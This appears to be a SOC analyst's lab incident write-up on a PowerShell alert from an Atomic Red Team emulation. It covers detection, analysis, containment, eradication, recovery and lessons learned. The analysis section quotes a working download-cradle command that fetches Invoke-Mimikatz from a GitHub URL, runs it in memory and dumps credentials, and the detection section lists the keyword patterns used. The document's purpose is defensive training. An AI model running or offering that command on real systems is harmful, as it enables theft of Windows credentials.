## Incident 1 — Suspicious PowerShell Execution (Mimikatz Download Cradle)

**Incident title:** T1059.001 – Suspicious PowerShell Execution
**Host:** CLIENT01.lab.local
**Alert source:** T1059.001 — Command and Scripting Interpreter: PowerShell
**Related events:** 19 grouped events
**MITRE mapping:** Execution — T1059.001 (Command and Scripting Interpreter: PowerShell)

## Triage

### Detect

During the initial review of the alert firing, we should: 

- Determine what the alert is and rule or logic has caused the alert to fire.
- Severity Rating? Confidence Level (Usually system allocated)?
- What is the impacted systems or users? Are these users/systems critical or high-privileged?
- Ultimately, make a judgement call if this alert is worth investigating further or if there are higher-priority alerts.


Sysmon Event ID 1 (Process Create) captured PowerShell launched with patterns associated with malicious use — matching on -enc, FromBase64String, DownloadString, IEX, hidden, -nop rather than benign administrative PowerShell usage. The alert fired on 19 related events. Host is a standard endpoint/workstation (CLIENT01), not a domain controller or server, therefore, moderate initial priority, the surround context/information with what parameters are being utilised in Powershell will decide whether the alert has fired on administrative behaviour or true malicious intent.

### Analyse

Captured command line:

```
"cmd.exe" /c powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

To summarise:

- `cmd.exe /c` is launched with the `/c` with the purpose to spawn CMD and carry out a specific command then immediately terminate.

- Suspiciously, PowerShell is created as a Process where invoke-expression is utilised: `IEX (New-Object Net.WebClient).DownloadString` -> This command means the system will download/fetch a URL and execute in memory, without saving to disk. This exhibits evasive behaviour due to the URL download being executed in memory, leaving no trace on the disk.

- `https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1` - This is a known link to Mimikatz - A known offensive tool to dump passwords from memory on Windows systems.

- `Invoke-Mimikatz` - The Powershell function name to load Mimikatz into memory.

- `-DumpCreds` - Parameter to invoke Minimkat'z credential dumping process.

**Initial Access Consideration:** During the analysis stage, we should ascertain how the adversary got a foothold in the first place to the point they could run Powershell, download Minikatz and dump the credentials. Were there any vulnerabilities exploited? Malicious Email Attachments or any exposed remote access. Due to the attack being emulated via Atomic Red Team, such information on the initial access is not available

**Persistence Consideration:** Although no persistence mechanism was captured in the alerts reviewed, given credential access was confirmed, it's wise to check for scheduled tasks, registry run keys, or startup entries that may indicate the adversary attempted to maintain access beyond this single execution.

**Verdict:** **True Positive** - This is classic credential access via a Powershell download cradle where specifically Minimkatz is being downloaded and executed within memory for evasion.

**Confidence Level:** High 

### Containment

Based on the analyse stage, containment is an imperative step as adversary behaviour has been exhibited with credential access. We need to understand the exposure and if the adversary has been successful in gaining any new credentials to laterally move.

1. Isolate the workstation `Client01` from the network.

2. If possible, with Mimikatz being downloaded and ran in memory, we should capture the memory/process artifacts before powering off the machine due to the memory being volatile, where such imperative artefacts will be lost. 

3. Block the full source URL at the web proxy. The domain where the Mimikatz URL is being hosted is on a legitimate website (GitHub), therefore it is advisable that a FULL domain block on GitHub is not viable, unless the user does not require access to GitHub for their duties. Therefore, it should be heavily considered to block the full malicious URL path.

4. Pivot on the URL to understand the scope/exposure to understand what other systems/users have the same activity. The uniqueness of the URL, such as `f650520c4b1004daf8b3ec08007a0b945b91253a` allows for an easy IOC to be pivoted on. We can then ensure the we are containing the max scope of the incident, not just a single instance.

### Eradication

No behaviour exhibited has shown a malicious artefact being written to disk; in-memory execution only. 
Therefore, after capturing memory and the process tree with FTK imager, Volatility etc. We should kill the malicious PowerShell process(es) still resident in memory. If persistence was identified during analysis, remove the associated scheduled task/registry/startup entry.

Additionally, as credentials were dumped from memory, for those accounts affected, the credentials should be reset and changed for every account affected. We should treat such affected accounts as compromised.

### Recovery

Only once `Client01` is clean, should we restore the workstation back to the network.

Where the initial access vector is known, it should be remediated (e.g. patching an exploited vulnerability, disabling unneeded remote services, phishing awareness training). It's important to reiterate, though in this lab scenario, that initial access vector wasn't part of the emulation, so this step is a placeholder for what a live investigation would require.

It should also be considered to monitor the affected hosts post-incident as the adversary may attempt to gain a foothold on the previous infected host/systems.

### Lesson Learned

Following a post-incident meeting, it's important to review what worked well and needs to be improved. 

For this specific incident, we should consider:

- Implementing preventative controls: The adversary was able to download and execute an unsigned, malicious `.ps1` script via Powershell. The recommendation would be to change Powershell's execution policy (`AllSigned`) so would require all scripts/exes to be digitally signed by a trusted publisher.

- Review incident procedures with dealing with volatile memory: How well did it work to capture the required memory artefacts prior to power-off?

- Detection Tuning: As discovered in the creation of the detection rule, this rule was initially configured with a 5-minute lookback, which caused missed events due to ingestion latency. Updating to a 1-hour lookback with suppression enabled fixed that issue.
